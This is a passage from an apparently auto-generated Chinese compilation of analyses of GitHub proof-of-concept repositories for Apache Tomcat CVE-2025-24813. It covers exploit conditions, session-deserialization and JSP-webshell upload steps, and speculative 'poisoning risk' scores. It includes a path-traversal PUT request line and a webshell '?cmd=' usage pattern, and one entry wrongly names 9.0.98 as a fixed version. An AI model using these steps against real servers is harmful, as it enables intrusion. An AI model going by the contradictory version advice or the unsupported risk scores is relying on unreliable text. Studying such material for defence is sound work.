**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
